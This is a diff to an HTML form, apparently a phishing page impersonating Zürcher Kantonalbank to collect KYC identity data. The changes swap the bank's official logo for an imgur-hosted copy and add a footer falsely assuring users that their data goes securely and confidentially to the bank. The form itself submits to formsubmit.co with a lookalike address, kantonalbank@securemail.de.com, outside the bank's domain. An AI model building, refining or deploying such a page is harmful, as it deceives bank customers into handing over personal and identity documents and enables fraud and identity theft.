@@ -79,6 +79,23 @@
       background-color: #005ea6;
     }
 
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+      margin-top: 50px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .footer hr {
+      margin: 30px auto 15px;
+      border: none;
+      height: 1px;
+      background-color: #ddd;
+    }
+
     @media (max-width: 600px) {
       .name-fields {
         flex-direction: column;
@@ -93,7 +110,7 @@
 <body>
   <div class="form-container">
     <a href="https://www.zkb.ch/en/home.html" target="_blank">
-      <img class="logo" src="https://www.zkb.ch/etc.clientlibs/settings/wcm/designs/zkb/clientlibs/clientlib-base/resources/img/logo_zkb_de.png" alt="ZKB Logo">
+      <img class="logo" src="https://i.imgur.com/JV2tDsT.png" alt="ZKB Logo">
     </a>
     <h2>Freischaltung Ihres Sicherheitskontos</h2>
     <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
@@ -141,6 +158,11 @@
 
       <button type="submit">Absenden</button>
     </form>
+  </div>
+
+  <div class="footer">
+    <hr>
+    <p>Dieses Formular dient der sicheren Übermittlung von KYC-Daten zur Freischaltung eines Sicherheitskontos bei der Zürcher Kantonalbank. Bitte beachten Sie, dass alle Angaben vertraulich behandelt und ausschließlich zur Verifikation verwendet werden.</p>
   </div>
 </body>
 </html>
